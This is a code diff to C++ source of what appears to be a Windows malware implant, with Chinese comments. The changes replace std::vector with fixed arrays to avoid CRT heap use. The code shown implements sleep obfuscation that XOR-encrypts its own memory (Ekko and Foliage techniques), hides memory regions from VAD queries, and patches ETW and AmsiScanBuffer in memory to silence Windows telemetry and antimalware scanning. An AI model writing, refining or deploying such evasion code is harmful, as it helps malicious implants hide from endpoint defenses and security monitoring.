@@ -52,13 +52,22 @@ void SleepObfuscator::XorCrypt(void* data, SIZE_T size, BYTE key) {
 }
 
 // 返回自身代码所在页面的基地址 (用于 EkkoSleep 自身页豁免)
+// ★ v3.125: 使用 EkkoSleepMarker 确保与 EkkoSleep 在同一编译单元且同页
+namespace {
+    // 占位函数: 与 EkkoSleep 在同一 .cpp 文件, 确保代码页被豁免
+    static void EkkoSleepMarker() {}
+}
 uintptr_t SleepObfuscator::GetSelfPage() {
-    // &SelfPageMaskHelper 是此 .cpp 文件中的静态函数, 与 EkkoSleep 在同一编译单元
-    return reinterpret_cast<uintptr_t>(&GetSelfPage) & ~0xFFFULL;
+    // 使用 EkkoSleepMarker 的地址 — 与 EkkoSleep 在同一编译单元,
+    // 编译器将其放置在 .text 区段的临近位置, 大概率在同一 4KB 页面
+    return reinterpret_cast<uintptr_t>(&EkkoSleepMarker) & ~0xFFFULL;
 }
 
 void SleepObfuscator::RegisterProtectedRegion(void* addr, SIZE_T size) {
-    ProtectedRegion region;
+    // ★ v3.125: 固定数组 — 检查容量
+    if (m_regionCount >= MAX_REGIONS) return;
+
+    ProtectedRegion& region = m_regions[m_regionCount++];
     region.addr = addr;
     region.size = size;
     region.isCode = false;
@@ -67,12 +76,13 @@ void SleepObfuscator::RegisterProtectedRegion(void* addr, SIZE_T size) {
     std::mt19937 rng(static_cast<unsigned>(
         std::chrono::steady_clock::now().time_since_epoch().count()));
     region.xorKey = static_cast<BYTE>(rng());
-
-    m_regions.push_back(region);
 }
 
 void SleepObfuscator::RegisterProtectedCode(void* addr, SIZE_T size) {
-    ProtectedRegion region;
+    // ★ v3.125: 固定数组 — 检查容量
+    if (m_regionCount >= MAX_REGIONS) return;
+
+    ProtectedRegion& region = m_regions[m_regionCount++];
     region.addr = addr;
     region.size = size;
     region.isCode = true;
@@ -80,12 +90,12 @@ void SleepObfuscator::RegisterProtectedCode(void* addr, SIZE_T size) {
     std::mt19937 rng(static_cast<unsigned>(
         std::chrono::steady_clock::now().time_since_epoch().count()));
     region.xorKey = static_cast<BYTE>(rng());
-
-    m_regions.push_back(region);
 }
 
 void SleepObfuscator::EncryptAll() {
-    for (auto& region : m_regions) {
+    // ★ v3.125: 固定数组 — 只遍历 m_regionCount 个有效条目
+    for (int ri = 0; ri < m_regionCount; ri++) {
+        ProtectedRegion& region = m_regions[ri];
         if (region.isCode) {
             DWORD oldProtect;
             if (!VirtualProtect(region.addr, region.size, PAGE_READWRITE, &oldProtect)) {
@@ -109,7 +119,9 @@ void SleepObfuscator::EncryptAll() {
 }
 
 void SleepObfuscator::DecryptAll() {
-    for (auto& region : m_regions) {
+    // ★ v3.125: 固定数组 — 只遍历 m_regionCount 个有效条目
+    for (int ri = 0; ri < m_regionCount; ri++) {
+        ProtectedRegion& region = m_regions[ri];
         if (region.isCode) {
             DWORD oldProtect;
             if (!VirtualProtect(region.addr, region.size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
@@ -131,7 +143,8 @@ void SleepObfuscator::DecryptAll() {
 }
 
 void SleepObfuscator::ObfuscatedSleep(DWORD milliseconds) {
-    if (m_regions.empty()) {
+    // ★ v3.125: 固定数组 m_regionCount
+    if (m_regionCount == 0) {
         Sleep(milliseconds);
         return;
     }
@@ -157,7 +170,8 @@ void SleepObfuscator::EkkoSleep(DWORD milliseconds) {
     // Ekko 技术: 使用 WaitableTimer 替代 Sleep
     // 在计时器触发前加密内存, 触发后解密
 
-    if (m_regions.empty()) {
+    // ★ v3.125: 固定数组 m_regionCount
+    if (m_regionCount == 0) {
         Sleep(milliseconds);
         return;
     }
@@ -191,7 +205,8 @@ void SleepObfuscator::FoliageSleep(DWORD milliseconds) {
     // Foliage 技术: 使用 NtWaitForSingleObject 的 APC 变体
     // 当 APC 排队时, 线程被唤醒 → 加密内存 → 继续等待
 
-    if (m_regions.empty()) {
+    // ★ v3.125: 固定数组 m_regionCount
+    if (m_regionCount == 0) {
         Sleep(milliseconds);
         return;
     }
@@ -518,20 +533,25 @@ uintptr_t PhantomSection::AllocatePhantomInProcess(HANDLE hProcess, SIZE_T size)
 // ★ Fix B2: VAD Hiding — NtQueryVirtualMemory 代理实现
 // ============================================================
 
-std::vector<PhantomSection::VADHiddenRegion> PhantomSection::s_vadHiddenRegions;
+// ★ v3.125: 固定数组替代 std::vector — 避免 CRT 堆依赖
+PhantomSection::VADHiddenRegion PhantomSection::s_vadHiddenRegions[PhantomSection::MAX_VAD_REGIONS];
+int PhantomSection::s_vadRegionCount = 0;
 
 void PhantomSection::RegisterForVADHide(void* addr, SIZE_T size) {
     if (!addr || size == 0) return;
+    // ★ v3.125: 固定数组 — 检查容量
+    if (s_vadRegionCount >= MAX_VAD_REGIONS) return;
 
-    VADHiddenRegion region;
+    VADHiddenRegion& region = s_vadHiddenRegions[s_vadRegionCount++];
     region.addr = addr;
     region.size = size;
-    s_vadHiddenRegions.push_back(region);
 }
 
 bool PhantomSection::IsInVADHiddenRegion(void* addr) {
     uintptr_t target = reinterpret_cast<uintptr_t>(addr);
-    for (auto& region : s_vadHiddenRegions) {
+    // ★ v3.125: 固定数组 — 只遍历 s_vadRegionCount 个有效条目
+    for (int i = 0; i < s_vadRegionCount; i++) {
+        const VADHiddenRegion& region = s_vadHiddenRegions[i];
         uintptr_t base = reinterpret_cast<uintptr_t>(region.addr);
         if (target >= base && target < base + region.size) {
             return true;
@@ -901,7 +921,9 @@ bool TelemetrySilencer::DisableETW() {
     // 保存原始字节
     s_etwPatch.addr = etwAddr;
     s_etwPatch.size = 3; // ret = C3, 但需要 xor eax,eax; ret = 33 C0 C3
-    s_etwPatch.originalBytes.assign(etwAddr, etwAddr + 3);
+    // ★ v3.125: 固定数组替代 std::vector
+    memcpy(s_etwPatch.originalBytes, etwAddr, 3);
+    s_etwPatch.originalSize = 3;
 
     // Patch: xor eax, eax; ret (返回 0, 表示成功)
     // 33 C0 = xor eax, eax
@@ -931,7 +953,9 @@ bool TelemetrySilencer::DisableAMSI() {
     s_amsiPatch.size = 6;
 
     // 保存原始字节
-    s_amsiPatch.originalBytes.assign(amsiAddr, amsiAddr + 6);
+    // ★ v3.125: 固定数组替代 std::vector
+    memcpy(s_amsiPatch.originalBytes, amsiAddr, 6);
+    s_amsiPatch.originalSize = 6;
 
     // AmsiScanBuffer 开头 patching:
     // mov eax, AMSI_RESULT_CLEAN (0x80070057 = E_INVALIDARG, 
@@ -953,7 +977,8 @@ bool TelemetrySilencer::RestoreETW() {
 
     DWORD oldProtect;
     VirtualProtect(s_etwPatch.addr, s_etwPatch.size, PAGE_EXECUTE_READWRITE, &oldProtect);
-    memcpy(s_etwPatch.addr, s_etwPatch.originalBytes.data(), s_etwPatch.size);
+    // ★ v3.125: 固定数组 originalBytes
+    memcpy(s_etwPatch.addr, s_etwPatch.originalBytes, s_etwPatch.size);
     VirtualProtect(s_etwPatch.addr, s_etwPatch.size, oldProtect, &oldProtect);
 
     s_etwPatch.addr = nullptr;
@@ -965,7 +990,8 @@ bool TelemetrySilencer::RestoreAMSI() {
 
     DWORD oldProtect;
     VirtualProtect(s_amsiPatch.addr, s_amsiPatch.size, PAGE_EXECUTE_READWRITE, &oldProtect);
-    memcpy(s_amsiPatch.addr, s_amsiPatch.originalBytes.data(), s_amsiPatch.size);
+    // ★ v3.125: 固定数组 originalBytes
+    memcpy(s_amsiPatch.addr, s_amsiPatch.originalBytes, s_amsiPatch.size);
     VirtualProtect(s_amsiPatch.addr, s_amsiPatch.size, oldProtect, &oldProtect);
 
     s_amsiPatch.addr = nullptr;
